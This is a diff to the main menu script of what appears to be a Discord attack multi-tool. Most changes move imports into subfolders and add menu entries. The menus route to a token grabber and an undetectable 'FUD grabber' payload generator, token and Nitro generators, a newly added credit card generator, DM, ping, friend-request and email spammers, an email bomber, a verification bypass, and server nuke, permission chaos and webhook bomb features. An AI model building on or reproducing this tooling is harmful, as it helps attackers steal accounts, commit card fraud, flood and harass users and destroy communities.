@@ -7,12 +7,12 @@ import subprocess
 from discord_webhook import DiscordWebhook
 import inquirer
 import shutil
-from utils.spammer import spam_webhook, loading_spinner
+from utils.spamming.spammer import spam_webhook, loading_spinner
 from colorama import Fore, Style, init
-from utils.update import main as run_updater
-from utils.nitro_generator import run_nitro_generator
-from utils.token_generator import run_token_generator
-from utils.grabber import get_token
+from utils.config.update import main as run_updater
+from utils.generators.nitro_generator import run_nitro_generator
+from utils.tokens.token_generator import run_token_generator
+from utils.grabbers.grabber import get_token
 
 init()
 
@@ -350,7 +350,7 @@ def theme_spam_menu():
 
     debug = input(rgb(255,32,32) + center("Enable debug mode? (y/n): ") + RESET).lower() == 'y'
 
-    from utils.theme_spammer import spam_theme
+    from utils.spamming.theme_spammer import spam_theme
     spam_theme(token, amount, interval, debug)
 
 def ask_token(prompt="Enter Discord Token: "):
@@ -387,10 +387,10 @@ def token_login_menu():
             
         if answers['choice'] == 'Selenium Login (Reccomended)':
             debug = input(rgb(255,32,32) + "Enable debug mode? (y/n): " + RESET).lower() == 'y'
-            from utils.token_login import login_with_token
+            from utils.tokens.token_login import login_with_token
             login_with_token(token, debug)
         elif answers['choice'] == 'Browser Login (Not Recoomended)':
-            from utils.browser_login import run_browser_login_new_window
+            from utils.tokens.browser_login import run_browser_login_new_window
             run_browser_login_new_window(token)
             
         questions = [
@@ -404,10 +404,10 @@ def token_login_menu():
             break
 
 def server_cloner_menu():
-    subprocess.run([sys.executable, 'utils/server_cloner.py'])
+    subprocess.run([sys.executable, 'utils/servers/server_cloner.py'])
 
 def webhook_deleter_menu():
-    subprocess.run([sys.executable, 'utils/webhook_deleter.py'])
+    subprocess.run([sys.executable, 'utils/servers/webhook_deleter.py'])
 
 def set_grabber_webhook_menu():
     global status_message
@@ -645,19 +645,19 @@ def spam_tools_menu():
         elif answers['choice'] == 'Theme Spammer':
             theme_spam_menu()
         elif answers['choice'] == 'Ping Spam':
-            from utils.ping_spam import run_ping_spam
+            from utils.spamming.ping_spam import run_ping_spam
             run_ping_spam()
         elif answers['choice'] == 'Channel Spam':
-            from utils.channel_spam import run_channel_spam
+            from utils.spamming.channel_spam import run_channel_spam
             run_channel_spam()
         elif answers['choice'] == 'DM Spam':
-            from utils.dm_spam import run_dm_spam
+            from utils.spamming.dm_spam import run_dm_spam
             run_dm_spam()
         elif answers['choice'] == 'Friend Request Spam':
-            from utils.friend_request_spam import run_friend_request_spam
+            from utils.spamming.friend_request_spam import run_friend_request_spam
             run_friend_request_spam()
         elif answers['choice'] == 'Email Spam':
-            from utils.email_spam import run_email_spam
+            from utils.spamming.email_spam import run_email_spam
             run_email_spam()
             
         questions = [
@@ -684,6 +684,9 @@ def discord_tools_menu():
                              'Mass Join/Leave',
                              'Mass React',
                              'Verification Bypass',
+                             'Server Scanner',
+                             'User Lookup',
+                             'Invite Resolver',
                              '← Back to main menu'
                          ]),
         ]
@@ -694,13 +697,13 @@ def discord_tools_menu():
         if answers['choice'] == 'Close All DMs':
             token = ask_token()
             if token:
-                from utils.close_dms import close_all_dms
+                from utils.users.close_dms import close_all_dms
                 success, total = close_all_dms(token)
                 pretty_print(f"Result: {success} of {total} DMs closed", (0,255,0))
         elif answers['choice'] == 'Unfriend All Friends':
             token = ask_token()
             if token:
-                from utils.unfriend import unfriend_all
+                from utils.users.unfriend import unfriend_all
                 success, total = unfriend_all(token)
                 pretty_print(f"Result: {success} of {total} friends removed", (0,255,0))
         elif answers['choice'] == 'DM All Friends':
@@ -708,13 +711,13 @@ def discord_tools_menu():
             if token:
                 message = clean_singleline_input_left("Enter message: ")
                 if message:
-                    from utils.dm_all import dm_all_friends
+                    from utils.users.dm_all import dm_all_friends
                     success, total = dm_all_friends(token, message)
                     pretty_print(f"Result: {success} of {total} messages sent", (0,255,0))
         elif answers['choice'] == 'Delete/Leave All Servers':
             token = ask_token()
             if token:
-                from utils.leave_servers import leave_all_servers
+                from utils.servers.leave_servers import leave_all_servers
                 deleted, left, failed, total = leave_all_servers(token)
                 pretty_print("Result:", (0,255,0))
                 pretty_print(f"- {deleted} servers deleted", (0,255,0))
@@ -722,14 +725,23 @@ def discord_tools_menu():
                 pretty_print(f"- {failed} errors", (255,0,0))
                 pretty_print(f"- {total} servers total", (0,255,0))
         elif answers['choice'] == 'Mass Join/Leave':
-            from utils.mass_join_leave import run_mass_join_leave
+            from utils.spamming.mass_join_leave import run_mass_join_leave
             run_mass_join_leave()
         elif answers['choice'] == 'Mass React':
-            from utils.mass_react import run_mass_react
+            from utils.spamming.mass_react import run_mass_react
             run_mass_react()
         elif answers['choice'] == 'Verification Bypass':
-            from utils.verification_bypass import run_verification_bypass
+            from utils.spamming.verification_bypass import run_verification_bypass
             run_verification_bypass()
+        elif answers['choice'] == 'Server Scanner':
+            from utils.discord_api.server_scanner import run_server_scanner
+            run_server_scanner()
+        elif answers['choice'] == 'User Lookup':
+            from utils.discord_api.user_lookup import run_user_lookup
+            run_user_lookup()
+        elif answers['choice'] == 'Invite Resolver':
+            from utils.discord_api.invite_resolver import run_invite_resolver
+            run_invite_resolver()
                 
         questions = [
             inquirer.List('continue',
@@ -761,12 +773,12 @@ def token_tools_menu():
         if answers['choice'] == 'Token Info':
             token = ask_token()
             if token:
-                from utils.token_info import display_token_info
+                from utils.tokens.token_info import display_token_info
                 display_token_info(token)
         elif answers['choice'] == 'Token Login':
             token_login_menu()
         elif answers['choice'] == 'Token Checker':
-            from utils.token_checker import run_token_checker
+            from utils.tokens.token_checker import run_token_checker
             run_token_checker()
             
         questions = [
@@ -801,7 +813,7 @@ def server_tools_menu():
         elif answers['choice'] == 'Webhook Deleter':
             webhook_deleter_menu()
         elif answers['choice'] == 'Server Management':
-            from utils.server_management import run_server_management
+            from utils.servers.server_management import run_server_management
             run_server_management()
             
         questions = [
@@ -832,13 +844,13 @@ def user_tools_menu():
             break
             
         if answers['choice'] == 'Custom Status Changer':
-            from utils.status_changer import run_status_changer
+            from utils.users.status_changer import run_status_changer
             run_status_changer()
         elif answers['choice'] == 'Nickname Changer':
-            from utils.nickname_changer import run_nickname_changer
+            from utils.users.nickname_changer import run_nickname_changer
             run_nickname_changer()
         elif answers['choice'] == 'Avatar Changer':
-            from utils.avatar_changer import run_avatar_changer
+            from utils.users.avatar_changer import run_avatar_changer
             run_avatar_changer()
             
         questions = [
@@ -867,7 +879,7 @@ def settings_tools_menu():
             break
             
         if answers['choice'] == 'Language & Theme Spam':
-            from utils.settings_spam import run_settings_spam
+            from utils.spamming.settings_spam import run_settings_spam
             run_settings_spam()
             
         questions = [
@@ -889,6 +901,7 @@ def generators_menu():
                          choices=[
                              'Nitro Generator & Checker',
                              'Token Generator',
+                             'Credit Card Generator',
                              '← Back to main menu'
                          ]),
         ]
@@ -900,6 +913,9 @@ def generators_menu():
             run_nitro_generator()
         elif answers['choice'] == 'Token Generator':
             run_token_generator()
+        elif answers['choice'] == 'Credit Card Generator':
+            from utils.generators.credit_card_generator import run_credit_card_generator
+            run_credit_card_generator()
             
         questions = [
             inquirer.List('continue',
@@ -919,6 +935,9 @@ def non_discord_tools_menu():
                          message="Non-Discord Tools - Choose an option:",
                          choices=[
                              ' Email Bomber',
+                             ' Advanced IP & Network Scanner',
+                             ' Website Security Analyzer',
+                             ' Crypto & Hash Tools',
                              '← Back to main menu'
                          ]),
         ]
@@ -927,8 +946,17 @@ def non_discord_tools_menu():
             break
             
         if answers['choice'] == ' Email Bomber':
-            from utils.email_bomber import run_email_bomber
+            from utils.email.email_bomber import run_email_bomber
             run_email_bomber()
+        elif answers['choice'] == ' Advanced IP & Network Scanner':
+            from utils.network.ip_scanner import run_ip_scanner
+            run_ip_scanner()
+        elif answers['choice'] == ' Website Security Analyzer':
+            from utils.web.website_analyzer import run_website_analyzer
+            run_website_analyzer()
+        elif answers['choice'] == ' Crypto & Hash Tools':
+            from utils.crypto.crypto_tools import run_crypto_tools
+            run_crypto_tools()
             
         questions = [
             inquirer.List('continue',
@@ -961,22 +989,22 @@ def advanced_destruction_menu():
             break
             
         if answers['choice'] == ' Server Nuke':
-            from utils.server_nuke import run_server_nuke
+            from utils.servers.server_nuke import run_server_nuke
             run_server_nuke()
         elif answers['choice'] == ' Mass Ban/Kick Manager':
-            from utils.mass_ban_kick import run_mass_ban_kick
+            from utils.spamming.mass_ban_kick import run_mass_ban_kick
             run_mass_ban_kick()
         elif answers['choice'] == ' Permission Chaos':
-            from utils.permission_chaos import run_permission_chaos
+            from utils.advanced.permission_chaos import run_permission_chaos
             run_permission_chaos()
         elif answers['choice'] == ' Channel Flood':
-            from utils.channel_flood import run_channel_flood
+            from utils.spamming.channel_flood import run_channel_flood
             run_channel_flood()
         elif answers['choice'] == ' Role Spam':
-            from utils.role_spam import run_role_spam
+            from utils.spamming.role_spam import run_role_spam
             run_role_spam()
         elif answers['choice'] == ' Webhook Bomb':
-            from utils.webhook_bomb import run_webhook_bomb
+            from utils.spamming.webhook_bomb import run_webhook_bomb
             run_webhook_bomb()
             
         questions = [
@@ -997,7 +1025,7 @@ def fud_grabber_menu():
     print()
     
 
-    from utils.mini_payload_generator import run_mini_payload_generator
+    from utils.grabbers.mini_payload_generator import run_mini_payload_generator
     run_mini_payload_generator()
 
 if __name__ == "__main__":
